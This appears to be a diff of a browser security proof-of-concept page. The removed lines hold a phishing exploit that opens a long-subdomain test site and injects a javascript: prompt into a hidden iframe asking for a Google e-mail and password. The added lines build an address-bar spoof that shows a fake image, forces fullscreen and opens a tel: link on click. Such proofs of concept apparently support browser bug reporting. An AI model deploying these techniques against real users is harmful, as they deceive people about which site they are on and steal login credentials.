@@ -1,22 +1,39 @@
-<html>
-  <body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
+  <title>Security UI Spoof</title>
+  <style>
+    html, body { height: 100%; margin: 0; padding: 0; }
+    #spoof { width: 100%; height: 100%; display: none; }
+    #content { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; }
+  </style>
+  <script>
+    // When the page is clicked, run the behaviour and open the tel: link
+    document.addEventListener('click', async () => {
+      try {
+        // keep the original behaviour (optional)
+        await navigator.contacts?.select?.(["name"], {});
+      } catch (e) {
+        // ignore if not available or permission denied
+      }
 
-    <script>
+      // show spoof image / hide content / try fullscreen
+      document.getElementById("spoof").style.display = "block";
+      document.getElementById("content").style.display = "none";
+      try { await document.documentElement.requestFullscreen(); } catch(e){}
 
-    function exploit() {
-      window.open("https://long-extended-subdomain-name-containing-many-letters-and-dashes.badssl.com/");
-      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
-    }
-    
-    </script>
-
-    <br><br><br><br>
-
-    <a href="#" onclick="exploit();">
-      <center><h1>Click here to go to Google.com</h1></center>
-    </a>
-
-    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
-
-  </body>
+      // open phone dialer using tel: URI
+      // this will attempt to navigate to the tel handler on the device
+      window.location.href = "tel:+212321";
+    }, { once: true });
+  </script>
+</head>
+<body>
+  <img id="spoof" src="spoof.png" alt="spoof image" />
+  <div id="content">
+    <h1>Click anywhere on the page to spoof the omnibox!</h1>
+  </div>
+</body>
 </html>
